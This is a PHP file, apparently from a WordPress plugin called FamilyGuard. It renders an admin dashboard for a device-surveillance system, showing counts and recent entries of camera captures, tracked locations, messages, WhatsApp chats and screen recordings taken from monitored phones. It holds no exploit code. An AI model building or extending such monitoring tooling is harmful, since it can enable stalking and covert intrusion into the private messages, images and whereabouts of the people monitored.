<?php
/**
 * Family Guard Admin Dashboard
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!current_user_can('manage_options')) {
    wp_die('Unauthorized');
}

global $wpdb;

$users_table = $wpdb->prefix . 'fmp_monitored_users';
$camera_table = $wpdb->prefix . 'fmp_camera_captures';
$location_table = $wpdb->prefix . 'fmp_locations';
$messages_table = $wpdb->prefix . 'fmp_messages';
$whatsapp_table = $wpdb->prefix . 'fmp_whatsapp_messages';
$recording_table = $wpdb->prefix . 'fmp_screen_recordings';
$logs_table = $wpdb->prefix . 'fmp_activity_logs';

$total_devices = $wpdb->get_var("SELECT COUNT(*) FROM $users_table WHERE is_active = 1");
$total_cameras = $wpdb->get_var("SELECT COUNT(*) FROM $camera_table");
$total_locations = $wpdb->get_var("SELECT COUNT(*) FROM $location_table");
$total_messages = $wpdb->get_var("SELECT COUNT(*) FROM $messages_table");
$total_whatsapp = $wpdb->get_var("SELECT COUNT(*) FROM $whatsapp_table");
$total_recordings = $wpdb->get_var("SELECT COUNT(*) FROM $recording_table");
$active_devices = $wpdb->get_var("SELECT COUNT(*) FROM $users_table WHERE last_seen > DATE_SUB(NOW(), INTERVAL 1 HOUR) AND is_active = 1");
?>

<div class="wrap fmp-dashboard-wrap">
    <div class="fmp-header">
        <h1>🛡️ FamilyGuard Monitoring Dashboard</h1>
        <p class="subtitle">Real-time monitoring and surveillance system</p>
    </div>

    <!-- Stats Grid -->
    <div class="fmp-stats-grid">
        <div class="stat-card">
            <div class="stat-icon">📱</div>
            <div class="stat-content">
                <h3>Total Devices</h3>
                <p class="stat-number"><?php echo $total_devices; ?></p>
            </div>
        </div>

        <div class="stat-card active">
            <div class="stat-icon">🟢</div>
            <div class="stat-content">
                <h3>Active Devices</h3>
                <p class="stat-number"><?php echo $active_devices; ?></p>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-icon">📷</div>
            <div class="stat-content">
                <h3>Camera Captures</h3>
                <p class="stat-number"><?php echo $total_cameras; ?></p>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-icon">📍</div>
            <div class="stat-content">
                <h3>Locations Tracked</h3>
                <p class="stat-number"><?php echo $total_locations; ?></p>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-icon">💬</div>
            <div class="stat-content">
                <h3>Messages</h3>
                <p class="stat-number"><?php echo $total_messages; ?></p>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-icon">💚</div>
            <div class="stat-content">
                <h3>WhatsApp Messages</h3>
                <p class="stat-number"><?php echo $total_whatsapp; ?></p>
            </div>
        </div>

        <div class="stat-card">
            <div class="stat-icon">🎬</div>
            <div class="stat-content">
                <h3>Screen Recordings</h3>
                <p class="stat-number"><?php echo $total_recordings; ?></p>
            </div>
        </div>
    </div>

    <!-- Navigation Cards -->
    <div class="fmp-nav-grid">
        <a href="admin.php?page=fmp-devices" class="nav-card">
            <div class="nav-icon">📱</div>
            <h3>Manage Devices</h3>
            <p>Add/Remove monitored devices</p>
        </a>

        <a href="admin.php?page=fmp-camera" class="nav-card">
            <div class="nav-icon">📷</div>
            <h3>Camera Feed</h3>
            <p>View live camera captures</p>
        </a>

        <a href="admin.php?page=fmp-locations" class="nav-card">
            <div class="nav-icon">🗺️</div>
            <h3>Locations</h3>
            <p>Track device locations</p>
        </a>

        <a href="admin.php?page=fmp-messages" class="nav-card">
            <div class="nav-icon">💬</div>
            <h3>Messages</h3>
            <p>View all messages</p>
        </a>

        <a href="admin.php?page=fmp-whatsapp" class="nav-card">
            <div class="nav-icon">💚</div>
            <h3>WhatsApp</h3>
            <p>Monitor WhatsApp chats</p>
        </a>

        <a href="admin.php?page=fmp-screen" class="nav-card">
            <div class="nav-icon">🎬</div>
            <h3>Screen Recordings</h3>
            <p>View screen recordings</p>
        </a>
    </div>

    <!-- Recent Activity -->
    <div class="fmp-recent-section">
        <h2>Recent Camera Captures</h2>
        <div class="fmp-gallery">
            <?php
            $recent_cameras = $wpdb->get_results("SELECT * FROM $camera_table ORDER BY capture_time DESC LIMIT 6");
            foreach ($recent_cameras as $capture) {
                echo '<div class="gallery-item">';
                echo '<img src="' . esc_url($capture->image_url) . '" alt="Camera capture" />';
                echo '<div class="overlay"><p>' . esc_html($capture->capture_time) . '</p></div>';
                echo '</div>';
            }
            ?>
        </div>
    </div>

    <!-- Recent Locations -->
    <div class="fmp-recent-section">
        <h2>Recent Locations</h2>
        <table class="wp-list-table widefat">
            <thead>
                <tr>
                    <th>Device</th>
                    <th>Latitude</th>
                    <th>Longitude</th>
                    <th>Address</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $recent_locations = $wpdb->get_results("SELECT * FROM $location_table ORDER BY timestamp DESC LIMIT 10");
                foreach ($recent_locations as $location) {
                    echo '<tr>';
                    echo '<td>' . esc_html($location->device_id) . '</td>';
                    echo '<td>' . esc_html($location->latitude) . '</td>';
                    echo '<td>' . esc_html($location->longitude) . '</td>';
                    echo '<td>' . esc_html($location->address) . '</td>';
                    echo '<td>' . esc_html($location->timestamp) . '</td>';
                    echo '</tr>';
                }
                ?>
            </tbody>
        </table>
    </div>
</div>
